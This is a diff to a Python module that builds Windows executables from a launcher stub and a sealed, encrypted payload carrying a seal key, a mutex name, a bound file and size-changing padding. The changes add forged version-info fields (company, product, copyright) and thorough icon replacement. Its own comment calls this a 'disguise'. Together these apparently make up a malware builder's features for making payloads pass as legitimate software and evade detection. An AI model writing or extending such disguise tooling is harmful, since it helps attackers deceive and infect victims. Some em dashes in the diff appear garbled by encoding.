@@ -7,7 +7,7 @@ Five things are owned here and nowhere else:
    One archive, one config, one schema, and ``agent/config.py`` reads the copy that
    is inside the file it is running from.
 2. The trailer. The seal key and the mutex name must exist before anything is
-   decrypted, so they cannot live in ``cfg.json`` — that file is inside the archive
+   decrypted, so they cannot live in ``cfg.json`` â€” that file is inside the archive
    those two unlock. They cannot live in the launcher either, or every build would
    need its own fresh freeze. So both travel in a fixed-width block welded between
    the sealed blob and the footer, and one launcher opens any artifact.
@@ -20,7 +20,7 @@ Five things are owned here and nowhere else:
    the script mode just spells it out in text instead of hiding it in a binary.
 5. The icon. Two build inputs arrive here that are not part of the config: an ``.ico``
    patched into the launcher's resources on the copy being written, and one file welded
-   into the payload archive under ``fused/``. Neither belongs in ``cfg.json`` — the
+   into the payload archive under ``fused/``. Neither belongs in ``cfg.json`` â€” the
    launcher is a file on the build machine, and the bound file has to be inside the
    archive for the agent to ever see it.
 
@@ -46,7 +46,7 @@ from dataclasses import dataclass
 from pathlib import Path
 from typing import Final, Literal
 
-from .schema import MAX_BALLAST_MB, RunConfig, to_dict
+from .schema import MAX_BALLAST_MB, RunConfig, VersionConfig, to_dict
 from .seal import MIN_SEALED_BYTES
 
 OutputMode = Literal["exe", "py"]
@@ -101,7 +101,7 @@ _REQUIRED_MEMBERS: Final[tuple[str, ...]] = (
 # A per-artifact icon is a patch on the copy being written, never a second freeze: one
 # launcher opens every build, and freezing per build would undo that. The patch is
 # awkward for one reason and the shape below exists for it. The launcher is a one-file
-# PyInstaller image — a PE image with a package archive welded to its tail — and a
+# PyInstaller image â€” a PE image with a package archive welded to its tail â€” and a
 # resource update rewrites the image and drops the tail. So the tail is measured before
 # the patch and re-appended after it.
 _PE_POINTER: Final[int] = 0x3C
@@ -229,6 +229,99 @@ def image_end(data: bytes) -> int:
     return end
 
 
+# --- the resource table -------------------------------------------------------
+
+# The update cycle owns every resource the build writes. Two rules came out of watching
+# it go wrong on a real launcher:
+#
+# 1. The group id is read from the stub, never assumed. A launcher whose icon lives at
+#    id 7 and a patch written at id 1 leaves two groups in the file, and which one the
+#    shell draws depends on the shell.
+# 2. Stale images are deleted, not left behind. Replacing a seven-image group with a
+#    two-image one otherwise leaves five orphan RT_ICON entries that the change-icon
+#    dialog still offers and that a group pointing at the wrong id would still render.
+#
+# Both are cheap here because the table is parsed before the update opens.
+
+
+@dataclass(frozen=True, slots=True)
+class ResourceRef:
+    """One resource row: its type, its id and the language it is filed under."""
+
+    kind: int
+    identifier: int
+    language: int
+
+
+def _pe_sections(data: bytes) -> tuple[tuple[tuple[int, int, int], ...], int]:
+    """``(virtual, size, raw_offset)`` per section, plus the resource directory RVA."""
+    pe = int.from_bytes(data[_PE_POINTER:_PE_POINTER + 4], "little")
+    if pe <= 0 or pe + _PE_COFF_HEADER > len(data) or data[pe:pe + 4] != _PE_SIGNATURE:
+        raise ForgeError("stub is not an executable image")
+
+    coff = pe + 4
+    count = int.from_bytes(data[coff + 2:coff + 4], "little")
+    optional_size = int.from_bytes(data[coff + 16:coff + 18], "little")
+    optional = coff + 20
+    if count <= 0 or count > _PE_MAX_SECTIONS or optional + optional_size > len(data):
+        raise ForgeError("stub has no usable section table")
+
+    # The data directories start after the fixed part of the optional header, which is
+    # 96 bytes for PE32 and 112 for PE32+. Reading the magic is cheaper than assuming.
+    magic = int.from_bytes(data[optional:optional + 2], "little")
+    directories = optional + (112 if magic == 0x20B else 96)
+    resource_rva = int.from_bytes(data[directories + 2 * 8:directories + 2 * 8 + 4], "little")
+
+    table = optional + optional_size
+    sections: list[tuple[int, int, int]] = []
+    for index in range(count):
+        base = table + index * _PE_SECTION_ENTRY
+        if base + _PE_SECTION_ENTRY > len(data):
+            raise ForgeError("stub section table runs past the file")
+        virtual = int.from_bytes(data[base + 12:base + 16], "little")
+        size = int.from_bytes(data[base + 8:base + 12], "little")
+        raw = int.from_bytes(data[base + 20:base + 24], "little")
+        sections.append((virtual, max(size, 1), raw))
+    return tuple(sections), resource_rva
+
+
+def _rva_offset(sections: tuple[tuple[int, int, int], ...], rva: int) -> int:
+    for virtual, size, raw in sections:
+        if virtual <= rva < virtual + size:
+            return raw + (rva - virtual)
+    raise ForgeError(f"resource rva {rva:#x} is in no section")
+
+
+def resource_refs(raw: bytes) -> tuple[ResourceRef, ...]:
+    """Every ``(type, id, language)`` row in the stub's resource table.
+
+    A named resource has no integer id and is reported with ``identifier = -1``: the
+    update path only ever touches integer rows, and a name is not one of them.
+    """
+    sections, resource_rva = _pe_sections(raw)
+    if resource_rva == 0:
+        return ()
+    root = _rva_offset(sections, resource_rva)
+
+    def rows(offset: int) -> list[tuple[int, int]]:
+        named = int.from_bytes(raw[root + offset + 12:root + offset + 14], "little")
+        ident = int.from_bytes(raw[root + offset + 14:root + offset + 16], "little")
+        out: list[tuple[int, int]] = []
+        for index in range(named + ident):
+            entry = root + offset + 16 + index * 8
+            name = int.from_bytes(raw[entry:entry + 4], "little")
+            target = int.from_bytes(raw[entry + 4:entry + 8], "little")
+            out.append((-1 if name & 0x80000000 else name, target))
+        return out
+
+    refs: list[ResourceRef] = []
+    for kind, kind_target in rows(0):
+        for identifier, id_target in rows(kind_target & 0x7FFFFFFF):
+            for language, _ in rows(id_target & 0x7FFFFFFF):
+                refs.append(ResourceRef(kind, identifier, language))
+    return tuple(refs)
+
+
 def _icon_entries(raw: bytes) -> list[IconEntry]:
     if len(raw) < _ICO_HEADER:
         raise ForgeError("icon is shorter than its own header")
@@ -302,15 +395,162 @@ def group_payload(entries: list[IconEntry]) -> bytes:
     return bytes(body)
 
 
-def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
-    """The stub's image with its icon resources replaced and its overlay put back.
+# --- the version resource -----------------------------------------------------
 
-    Windows-only, and the DLL is loaded inside the function so this module still
-    imports on a machine without ``kernel32``. The build side runs where the GUI runs,
-    but the Linux import test is a real test and it imports this file.
+# RT_VERSION is one resource, id 1, and it is what Explorer shows on the properties
+# sheet. The body is a tree of length-prefixed, 4-aligned blocks; every size below is
+# counted from the start of the block that holds it, which is the detail that makes a
+# hand-built blob load or silently not load.
+_RT_VERSION: Final[int] = 16
+_VERSION_ID: Final[int] = 1
+_VERSION_KEY: Final[str] = "VS_VERSION_INFO"
+# en-US, Unicode. The code page is the second half and 04B0 is "Unicode" rather than a
+# real code page, which is what every string in the tree is encoded as.
+_STRING_TABLE: Final[str] = "040904B0"
+_LANGUAGE: Final[int] = 0x0409
+_CODE_PAGE: Final[int] = 0x04B0
+_VERSION_NODE_HEADER: Final[int] = 6
+_FIXED_SIGNATURE: Final[int] = 0xFEEF04BD
+_FIXED_STRUCTURE: Final[int] = 0x00010000
+_FIXED_FLAGS_MASK: Final[int] = 0x3F
+_FILE_OS_NT: Final[int] = 0x00040004
+_FILE_TYPE_APP: Final[int] = 0x00000001
+# A version block that is larger than this is a paste accident, not a disguise.
+MAX_VERSION_BYTES: Final[int] = 8 * 1024
+
+
+def _pad4(size: int) -> int:
+    return (4 - size % 4) % 4
+
+
+def _version_node(
+    key: str,
+    *,
+    value: bytes = b"",
+    value_length: int = 0,
+    value_type: int = 0,
+    children: bytes = b"",
+) -> bytes:
+    """One block of the version tree, aligned relative to its own start."""
+    body = (key + "\0").encode("utf-16le")
+    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
+    body += value
+    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
+    body += children
+    body += b"\0" * _pad4(_VERSION_NODE_HEADER + len(body))
+    length = _VERSION_NODE_HEADER + len(body)
+    return struct.pack("<HHH", length, value_length, value_type) + body
+
+
+def version_parts(text: str) -> tuple[int, int]:
+    """``1.2.3.4`` as the two 32-bit halves ``VS_FIXEDFILEINFO`` stores."""
+    pieces = text.split(".")
+    if len(pieces) != 4:
+        raise ForgeError(f"{text!r}: a version is four numbers, a.b.c.d")
+    numbers: list[int] = []
+    for piece in pieces:
+        if not piece.isdigit():
+            raise ForgeError(f"{text!r}: {piece!r} is not a number")
+        value = int(piece)
+        if value > 0xFFFF:
+            raise ForgeError(f"{text!r}: {value} does not fit in 16 bits")
+        numbers.append(value)
+    return (numbers[0] << 16) | numbers[1], (numbers[2] << 16) | numbers[3]
+
+
+def _fixed_file_info(file_version: tuple[int, int], product_version: tuple[int, int]) -> bytes:
+    return struct.pack(
+        "<13I",
+        _FIXED_SIGNATURE,
+        _FIXED_STRUCTURE,
+        file_version[0],
+        file_version[1],
+        product_version[0],
+        product_version[1],
+        _FIXED_FLAGS_MASK,
+        0,
+        _FILE_OS_NT,
+        _FILE_TYPE_APP,
+        0,
+        0,
+        0,
+    )
+
+
+def _version_string(name: str, value: str) -> bytes:
+    if not value:
+        return b""
+    encoded = (value + "\0").encode("utf-16le")
+    # wValueLength for a text block counts characters, not bytes. Counting bytes here
+    # produces a block that loads and shows every other letter.
+    return _version_node(name, value=encoded, value_length=len(value) + 1, value_type=1)
+
+
+def version_blob(info: VersionConfig) -> bytes:
+    """The ``RT_VERSION`` body for ``info``. Empty when nothing was asked for."""
+    fields = (
+        ("CompanyName", info.company),
+        ("FileDescription", info.description),
+        ("ProductName", info.product),
+        ("LegalCopyright", info.copyright),
+        ("OriginalFilename", info.original_name),
+        ("FileVersion", info.file_version),
+        ("ProductVersion", info.product_version or info.file_version),
+    )
+    if not any(value for _name, value in fields):
+        return b""
+
+    strings = b"".join(_version_string(name, value) for name, value in fields)
+    file_version = version_parts(info.file_version or "1.0.0.0")
+    product_version = version_parts(info.product_version or info.file_version or "1.0.0.0")
+
+    table = _version_node(_STRING_TABLE, value_type=1, children=strings)
+    string_info = _version_node("StringFileInfo", value_type=1, children=table)
+    translation = _version_node(
+        "Translation",
+        value=struct.pack("<HH", _LANGUAGE, _CODE_PAGE),
+        value_length=4,
+        value_type=0,
+    )
+    variable_info = _version_node("VarFileInfo", value_type=1, children=translation)
+    fixed = _fixed_file_info(file_version, product_version)
+
+    blob = _version_node(
+        _VERSION_KEY,
+        value=fixed,
+        value_length=len(fixed),
+        value_type=0,
+        children=string_info + variable_info,
+    )
+    if len(blob) > MAX_VERSION_BYTES:
+        raise ForgeError(f"version block is {len(blob)} bytes, the ceiling is {MAX_VERSION_BYTES}")
+    return blob
+
+
+# --- the update cycle ---------------------------------------------------------
+
+
+def patch_resources(
+    stub: Path,
+    *,
+    icons: list[IconEntry] | None = None,
+    version: bytes | None = None,
+) -> bytes:
+    """The stub's image with its resources replaced and its overlay put back.
+
+    One ``BeginUpdateResource``/``EndUpdateResource`` cycle for everything the build
+    writes, because a second cycle would rewrite the image again and re-appending the
+    launcher's archive twice is how an artifact ends up with two tails.
+
+    Windows-only, and the DLL is loaded inside the function so this module still imports
+    on a machine without ``kernel32``. The Linux import test is a real test.
     """
+    if icons is None and version is None:
+        raise ForgeError("nothing to patch")
+    if icons is not None and not icons:
+        raise ForgeError("icon carries no images")
     if os.name != "nt":
-        raise ForgeError("icon replacement needs Windows")
+        raise ForgeError("resource replacement needs Windows")
 
     import ctypes
     from ctypes import wintypes
@@ -322,6 +562,29 @@ def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
 
     end = image_end(raw)
     overlay = raw[end:]
+    refs = resource_refs(raw[:end])
+
+    groups = [ref for ref in refs if ref.kind == _RT_GROUP_ICON and ref.identifier >= 0]
+    # The stub's own group id, not an assumption. A launcher that files its icon at 7
+    # and a patch written at 1 leaves two groups, and the shell picks.
+    group_id = min((ref.identifier for ref in groups), default=_GROUP_ID)
+    icon_language = groups[0].language if groups else 0
+    versions = [ref for ref in refs if ref.kind == _RT_VERSION and ref.identifier >= 0]
+    version_language = versions[0].language if versions else 0
+
+    doomed: list[ResourceRef] = []
+    if icons is not None:
+        # Every existing image and group goes, including ids past the new image count.
+        # They are what a replacement icon "did not fully take" looks like: the shell
+        # draws from the group, but the change-icon dialog and some thumbnailers still
+        # offer the orphans.
+        doomed += [
+            ref
+            for ref in refs
+            if ref.kind in (_RT_ICON, _RT_GROUP_ICON) and ref.identifier >= 0
+        ]
+    if version is not None:
+        doomed += versions
 
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     kernel32.BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
@@ -338,7 +601,7 @@ def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
     kernel32.EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
     kernel32.EndUpdateResourceW.restype = wintypes.BOOL
 
-    handle, name = tempfile.mkstemp(prefix="sable-icon-", suffix=".exe")
+    handle, name = tempfile.mkstemp(prefix="sable-res-", suffix=".exe")
     os.close(handle)
     image = Path(name)
 
@@ -355,23 +618,45 @@ def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
         kept: list[object] = []
         committed = True
 
-        def put(kind: int, identifier: int, payload: bytes) -> bool:
+        for ref in doomed:
+            # ``UpdateResource`` with no data and no size is the documented delete. It is
+            # used instead of ``DeleteResourceW`` because that export is not in every
+            # kernel32 (it is absent from the one this build runs against), and a resource
+            # API that is missing at runtime is a build that fails on somebody else's box.
+            #
+            # A refusal here is not fatal on its own: the write below lands on the same
+            # type/id/language and replaces it. The verification after the commit is what
+            # decides whether the table actually settled.
+            kernel32.UpdateResourceW(
+                update,
+                ctypes.c_void_p(ref.kind),
+                ctypes.c_void_p(ref.identifier),
+                ref.language,
+                None,
+                0,
+            )
+
+        def put(kind: int, identifier: int, payload: bytes, language: int) -> None:
+            nonlocal committed
             buffer = ctypes.create_string_buffer(payload, len(payload))
             kept.append(buffer)
-            return bool(
+            committed = bool(
                 kernel32.UpdateResourceW(
                     update,
                     ctypes.c_void_p(kind),
                     ctypes.c_void_p(identifier),
-                    0,
+                    language,
                     ctypes.cast(buffer, ctypes.c_void_p),
                     len(payload),
                 )
-            )
+            ) and committed
 
-        for index, entry in enumerate(entries):
-            committed = put(_RT_ICON, _ICON_FIRST_ID + index, entry.data) and committed
-        committed = put(_RT_GROUP_ICON, _GROUP_ID, group_payload(entries)) and committed
+        if icons is not None:
+            for index, entry in enumerate(icons):
+                put(_RT_ICON, _ICON_FIRST_ID + index, entry.data, icon_language)
+            put(_RT_GROUP_ICON, group_id, group_payload(icons), icon_language)
+        if version is not None:
+            put(_RT_VERSION, _VERSION_ID, version, version_language)
 
         # Discard on failure: a half-written resource table is not an image worth
         # keeping, and the staging file is thrown away either way.
@@ -380,20 +665,57 @@ def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
                 f"{stub}: resources did not commit ({ctypes.get_last_error()})"
             )
         if not committed:
-            raise ForgeError(f"{stub}: the icon was refused")
+            raise ForgeError(f"{stub}: the resource update was refused")
 
         patched = image.read_bytes()
     finally:
         _discard(image)
 
     # The image grows, so its new end is measured rather than assumed.
-    return patched[:image_end(patched)] + overlay
+    settled = patched[:image_end(patched)]
+
+    # Verified against the file that was just written, not against the calls that wrote
+    # it: an update that returns success and lands the row in a language nothing reads
+    # is exactly the failure this build shipped with.
+    after = resource_refs(settled)
+    if icons is not None:
+        images = {ref.identifier for ref in after if ref.kind == _RT_ICON}
+        expected = set(range(_ICON_FIRST_ID, _ICON_FIRST_ID + len(icons)))
+        if images != expected:
+            raise ForgeError(f"{stub}: icon table holds {sorted(images)}, wanted {sorted(expected)}")
+        drawn = {ref.identifier for ref in after if ref.kind == _RT_GROUP_ICON}
+        if drawn != {group_id}:
+            raise ForgeError(f"{stub}: group icons are {sorted(drawn)}, wanted [{group_id}]")
+    if version is not None and not any(ref.kind == _RT_VERSION for ref in after):
+        raise ForgeError(f"{stub}: the version block did not settle")
+
+    return settled + overlay
+
+
+def patch_icon(stub: Path, entries: list[IconEntry]) -> bytes:
+    """The stub's image with its icons replaced. Icon-only builds go through here."""
+    return patch_resources(stub, icons=entries)
 
 
 @contextlib.contextmanager
-def _icon_stub(stub: Path, icon: Path) -> Iterator[Path]:
-    """A staging copy of the launcher carrying ``icon``, valid for one build."""
-    patched = patch_icon(stub, icon_entries(icon))
+def _patched_stub(
+    stub: Path,
+    *,
+    icon: Path | None = None,
+    version: VersionConfig | None = None,
+) -> Iterator[Path]:
+    """A staging copy of the launcher carrying the build's resources."""
+    entries = icon_entries(icon) if icon is not None else None
+    blob = version_blob(version) if version is not None else None
+    if entries is None and not blob:
+        yield stub
+        return
+
+    patched = patch_resources(
+        stub,
+        icons=entries,
+        version=blob or None,
+    )
     handle, name = tempfile.mkstemp(prefix="sable-stub-", suffix=".exe")
     os.close(handle)
     target = Path(name)
@@ -683,6 +1005,7 @@ def build(
     mode: str = OUTPUT_EXE,
     stub: Path | None = None,
     icon: Path | None = None,
+    version: VersionConfig | None = None,
 ) -> Path:
     """Write the finished artifact. Returns ``destination``."""
     if mode not in OUTPUT_MODES:
@@ -698,12 +1021,12 @@ def build(
         if stub is None:
             raise ForgeError("exe output needs a frozen stub")
         ballast = _ballast(cfg.ballast_mb)
-        if icon is None:
-            return _write_exe(destination, stub, sealed, ballast, cfg)
         # The patch changes the launcher's size, so the offset the footer records has to
         # come from the patched copy. Passing the staged path through means the one
-        # place that computes it stays the one place that computes it.
-        with _icon_stub(stub, icon) as patched:
+        # place that computes it stays the one place that computes it. Icon and version
+        # are one staging pass: two update cycles would re-append the launcher's archive
+        # twice, and the second tail is not a tail any loader expects.
+        with _patched_stub(stub, icon=icon, version=version) as patched:
             return _write_exe(destination, patched, sealed, ballast, cfg)
 
     # Script output carries no ballast. The pad exists to change the size of a
@@ -721,6 +1044,7 @@ __all__ = [
     "KEY_SLOT",
     "MAX_FUSE_BYTES",
     "MAX_ICON_BYTES",
+    "MAX_VERSION_BYTES",
     "MUTEX_SLOT",
     "OUTPUT_EXE",
     "OUTPUT_MODES",
@@ -731,13 +1055,18 @@ __all__ = [
     "ForgeError",
     "IconEntry",
     "OutputMode",
+    "ResourceRef",
     "build",
     "expected_offset",
     "group_payload",
     "icon_entries",
     "image_end",
     "patch_icon",
+    "patch_resources",
     "payload",
+    "resource_refs",
     "script_text",
     "trailer",
+    "version_blob",
+    "version_parts",
 ]
